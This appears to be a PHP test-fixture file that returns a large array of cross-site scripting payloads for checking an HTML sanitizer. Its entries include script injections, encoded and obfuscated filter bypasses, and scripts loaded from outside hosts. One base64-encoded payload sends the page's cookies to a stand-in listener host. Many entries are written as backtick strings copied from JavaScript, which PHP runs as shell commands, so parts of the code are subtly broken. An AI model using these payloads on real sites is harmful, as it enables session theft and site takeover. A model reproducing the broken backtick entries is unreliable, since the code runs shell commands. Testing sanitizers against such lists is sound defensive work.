<?php

declare(strict_types=1);

return [
    "1\" onerror='alert(document.cookie)'",
    "1' onerror='alert('XSS exploited')'",
    "<script>alert('XSS exploited');</script>",
    '<div><b><span class="" onerror=""><tag><script>fff</script></script></tag></span></div>',
    '<b>gggg',
    "'-- drop table",
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
    "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
    "\<a onmouseover=\"alert(document.cookie)\"\>xxs link\</a\>",
    "\<a onmouseover=alert(document.cookie)\>xxs link\</a\>",
    '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>',
    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
    '<IMG SRC=# onmouseover="alert(\'xxs\')">',
    '<IMG SRC= onmouseover="alert(\'xxs\')">',
    '<IMG onmouseover="alert(\'xxs\')">',
    '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
    '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
    '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
    '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    '<IMG SRC="jav	ascript:alert(\'XSS\');">',
    '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
    '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
    '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
    '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
    '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
    '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
    '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>',
    '<<SCRIPT>alert("XSS");//\<</SCRIPT>',
    '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
    '<SCRIPT SRC=//xss.rocks/.j>',
    '<IMG SRC="`<javascript:alert>`(\'XSS\')"',
    '<iframe src=http://xss.rocks/scriptlet.html <',
    '\";alert(\'XSS\');//',
    '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
    '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
    '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
    '<IMG DYNSRC="javascript:alert(\'XSS\')">',
    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
    '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
    '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
    '<svg/onload=alert(\'XSS\')>',
    'Set.constructor`alert\x28document.domain\x29```',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<BGSOUND SRC="javascript:alert(\'XSS\');">',
    '<BR SIZE="&{alert(\'XSS\')}">',
    '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
    '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">',
    '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>',
    '<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">',
    '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
    '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>',
    '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
    "exp/*<A STYLE='no\xss:noxss(\"*//*\");
xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>",
    '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',
    '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
    '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
    '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
    '<XSS STYLE="behavior: url(xss.htc);">',
    '¼script¾alert(¢XSS¢)¼/script¾',
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
    '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
    '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
    '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
    '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
    '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
    '<DIV STYLE="background-image:\0075\0072\006C\0028\'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029\'\0029">',
    '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
    '<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>',
    '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
    '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML> ',
    '<XML SRC="xsstest.xml" ID=I></XML>  ',
    '<? echo(\'<SCR)\';
echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>',
    '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>',
    '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
    '<A HREF="http://1113982867/">XSS</A>',
    '<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">',
    '<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>',
    '<A HREF="http://ha.ckers.org@google">XSS</A>',
    '<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>',
    '"><img src="x:x" onerror="alert(XSS)">',


    // Filter bypass
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "<script/src=data:,alert()>",
    '<marquee/onstart=alert()>',
    '<video/poster/onerror=alert()>',
    '<isindex/autofocus/onfocus=alert()>',
    '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
    '<sCR<script>iPt>alert(1)</SCr</script>IPt>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>',
    '<img ismap=\'xxx\' itemtype=\'yyy style=width:100%;height:100%;position:fixed;left:0px;top:0px; onmouseover=alert(/XSS/)//\'>',

    // Dedicatet 1
    '<body oninput=javascript:alert(1)><input autofocus>',
    '<math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>',
    '<frameset onload=javascript:alert(1)>',
    '<table background="javascript:javascript:alert(1)">',
    '<!--<img src="--><img src=x onerror=javascript:alert(1)//">',
    '<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">',
    '<![><img src="]><img src=x onerror=javascript:alert(1)//">',
    '<style><img src="</style><img src=x onerror=javascript:alert(1)//">',
    '<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>',
    '<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>',
    '<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>',
    '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
    '<object data="data:text/html;base64,%(base64)s">',
    '<embed src="data:text/html;base64,%(base64)s">',
    '<b <script>alert(1)</script>0',
    '<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
    `<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>`,
    '<embed src="javascript:alert(1)">',
    '<img src="javascript:alert(1)">',
    '<image src="javascript:alert(1)">',
    '<script src="javascript:alert(1)">',
    '<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x',
    '<? foo="><script>javascript:alert(1)</script>">',
    '<! foo="><script>javascript:alert(1)</script>">',
    '</ foo="><script>javascript:alert(1)</script>">',
    `<? foo="><x foo='?><script>javascript:alert(1)</script>'>">`,
    '<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">',
    '<% foo><x foo="%><script>javascript:alert(1)</script>">',
    '<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>',
    '<img \x00src=x onerror="alert(1)">',
    '<img \x47src=x onerror="javascript:alert(1)">',
    '<img \x11src=x onerror="javascript:alert(1)">',
    '<img \x12src=x onerror="javascript:alert(1)">',
    '<img\x47src=x onerror="javascript:alert(1)">',
    '<img\x10src=x onerror="javascript:alert(1)">',
    '<img\x13src=x onerror="javascript:alert(1)">',
    '<img\x32src=x onerror="javascript:alert(1)">',
    '<img\x47src=x onerror="javascript:alert(1)">',
    '<img\x11src=x onerror="javascript:alert(1)">',
    '<img \x47src=x onerror="javascript:alert(1)">',
    '<img \x34src=x onerror="javascript:alert(1)">',
    '<img \x39src=x onerror="javascript:alert(1)">',
    '<img \x00src=x onerror="javascript:alert(1)">',
    '<img src\x09=x onerror="javascript:alert(1)">',
    '<img src\x10=x onerror="javascript:alert(1)">',
    '<img src\x13=x onerror="javascript:alert(1)">',
    '<img src\x32=x onerror="javascript:alert(1)">',
    '<img src\x12=x onerror="javascript:alert(1)">',
    '<img src\x11=x onerror="javascript:alert(1)">',
    '<img src\x00=x onerror="javascript:alert(1)">',
    '<img src\x47=x onerror="javascript:alert(1)">',
    '<img src=x\x09onerror="javascript:alert(1)">',
    '<img src=x\x10onerror="javascript:alert(1)">',
    '<img src=x\x11onerror="javascript:alert(1)">',
    '<img src=x\x12onerror="javascript:alert(1)">',
    '<img src=x\x13onerror="javascript:alert(1)">',
    '<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">',
    '<img src=x onerror=\x09"javascript:alert(1)">',
    '<img src=x onerror=\x10"javascript:alert(1)">',
    '<img src=x onerror=\x11"javascript:alert(1)">',
    '<img src=x onerror=\x12"javascript:alert(1)">',
    '<img src=x onerror=\x32"javascript:alert(1)">',
    '<img src=x onerror=\x00"javascript:alert(1)">',
    '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>',
    '<img src="x` `<script>javascript:alert(1)</script>"` `>',
    `<img src onerror /" '"= alt=javascript:alert(1)//">`,
    '<title onpropertychange=javascript:alert(1)></title><title title=>',
    '<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">',
    '<!--[if]><script>javascript:alert(1)</script -->',
    '<!--[if<img src=x onerror=javascript:alert(1)//]> -->',
    '<script src="/\%(jscript)s"></script>',
    '<script src="\%(jscript)s"></script>',
    '<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>',
    `<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X`,
    `<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>`,
    '<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d',
    '<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>',
    '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>',
    `<style>*[{}@import'%(css)s?]</style>X`,
    `<div style="font-family:'foo&#10;;color:red;';">XXX`,
    '<div style="font-family:foo}color=red;">XXX',
    '<// style=x:expressionjavascript:alert(1)>',
    '<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>',
    '<div style=content:url(%(svg)s)></div>',
    '<div style="list-style:url(http://foo.f)url(javascript:javascript:alert(1));">X',
    `<div id=d><div style="font-family:'sansB colorAredB'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>`,
    '<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X',
    '<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X',
    '<div id="x">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style>',
    `<x style="background:url('x&#1;;color:red;/*')">XXX</x>`,
    '<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>',
    '<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>',
    `<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>`,
    `<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>`,
    '<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
    '<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
    '<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾',
    'X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >',
    '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>',
    '<IMG SRC="jav&#x0D;ascript:alert("XSS");">',
    `perl -e 'print "<IMG SRC=java`,
    `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
    `perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out'`,
    `<IMG SRC=" &#14; javascript:alert('XSS');">'`,
    `<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
    '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
    `<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >',
    '<SCRIPT SRC=//ha.ckers.org/.j>',
    `<IMG SRC="javascript:alert('XSS')"`,
    '<iframe src=http://ha.ckers.org/scriptlet.html <',
    `\";alert('XSS');//`,
    '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
    `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
    `<BODY BACKGROUND="javascript:alert('XSS')">`,
    `<IMG DYNSRC="javascript:alert('XSS')">`,
    `<IMG LOWSRC="javascript:alert('XSS')">`,
    `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
    `<IMG SRC='vbscript:msgbox("XSS")'>`,
    '<IMG SRC="livescript:[code]">',
    `<BODY ONLOAD=alert('XSS')>`,
    `<BGSOUND SRC="javascript:alert('XSS');">`,
    `<BR SIZE="&{alert('XSS')}">`,
    `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
    '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">',
    `<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>'`,
    '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">',
    '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
    `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`,
    `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
    `exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>`,
    `<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
    `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
    `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
    `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
    `<XSS STYLE="xss:expression(alert('XSS'))">`,
    `<XSS STYLE="behavior: url(xss.htc);">`,
    `¼script¾alert(¢XSS¢)¼/script¾`,
    `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
    `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
    `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
    `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
    `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
    `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
    `<TABLE BACKGROUND="javascript:alert('XSS')">`,
    `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
    `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
    `<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`,
    `<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`,
    `<DIV STYLE="width: expression(alert('XSS'));">`,
    `<BASE HREF="javascript:alert('XSS');//">`,
    `<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>`,
    `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
    `<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>`,
    `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->`,
    `<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>`,
    '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
    'Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser',
    `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`,
    `<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`,
    `<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
    '<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    `<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>'`,
    '<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    '<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    `<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
    `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>'`,
    '<A HREF="http://66.102.7.147/">XSS</A>',
    `<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>'`,
    '<A HREF="http://1113982867/">XSS</A>',
    `<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>'`,
    '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
    '<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>',
    `<iframe src="&Tab;javascript:prompt(1)&Tab;">'`,
    `<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>''`,
    `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"'`,
    `<sVg><scRipt >alert&lpar;1&rpar; {Opera}'`,
    `<img/src='' onerror=this.onerror=confirm(1)'`,
    '<form><isindex formaction="javascript&colon;confirm(1)"',
    '<img src=``&NewLine; onerror=alert(1)&NewLine;',
    `<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>`,
    '<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
    '<script /**/>/**/alert(1)/**/</script /**/',
    `&#34;&#62;<h1/onmouseover='\u0061lert(1)'>`,
    `<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">`,
    '<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
    `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>`,
    '<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">',
    '<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',
    '<form><a href="javascript:\u0061lert&#x28;1&#x29;">X',
    `</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>`,
    '<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>',
    '<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>',
    '<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a',
    'http://www.google<script .com>alert(document.location)</script',
    '<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a',
    `<img/src=@&#32;&#13; onerror = prompt('&#49;')`,
    `<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;`,
];